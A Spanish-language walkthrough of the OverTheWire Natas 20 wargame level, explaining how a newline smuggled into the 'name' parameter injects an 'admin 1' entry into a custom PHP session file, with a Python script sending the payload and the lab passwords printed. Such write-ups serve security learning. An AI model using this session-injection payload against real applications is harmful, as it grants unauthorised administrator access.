# Natas 20

#### URL: http://natas20.natas.labs.overthewire.org/
#### Credenciales: natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

La propiedad nombre enviada a traves de la peticion es asignada a la variable superglobal $_SESSION:
``` php
if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}
```

Cada vez que se crea una sesion la funcion mywrite guarda en un archivo de sesion las linea "$key $value\n" para cada par de clave valor que halla en la sesion. En un caso normal se guardaria `name NuevoNombre\n`.

``` php
   $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
```

Cada vez que se inicia sesion la funcion myread revisa el archivo de sesion, lo divide en lineas, y cada linea la divide por un caracter de espacio, y `agrega como una propiedad de $_SESSION a la primera parte y le asigna como valor a la segunda parte`.
``` php 
$filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
```

Si pasamos 'nombre\nadmin 1' con una nueva cookie de sesion mywrite guardará esto en un archivo con el siguiente contenido:
```
nombre\n
admin 1\n
```

Luego vendra myread  y lo dividira en las lineas `nombre` y `admin 1` y asignará `$_SESSION["nombre"]=""` y `$_SESSION["admin"]=1` y esta ultima propiedad nos garantiza permisos de administrador:
``` php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
```

Aqui implementamos la solucion:
``` python
import requests
from base64 import b64encode

def check(sessid):
    URL= 'http://natas20.natas.labs.overthewire.org/index.php?debug'
    data = {'name': 'tatomihermano\nadmin 1'}
    headers = {'Authorization': f'Basic {b64encode(b"natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw").decode()}',
               'Cookie': f'PHPSESSID={sessid}',
               'Content-Type': 'application/x-www-form-urlencoded',
              }
    response = requests.post(URL,headers=headers,data=data)
    print(response.text)
       
# Cualquier ID sirve
check('0a1b2c3d4e5f6g7h8i9j')
```

Ejecutando este script con `python3 script.py` dos veces (porque myread no se ejecutará en la primera, porque no existe el archivo de sesion) obtenemos Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

`natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`
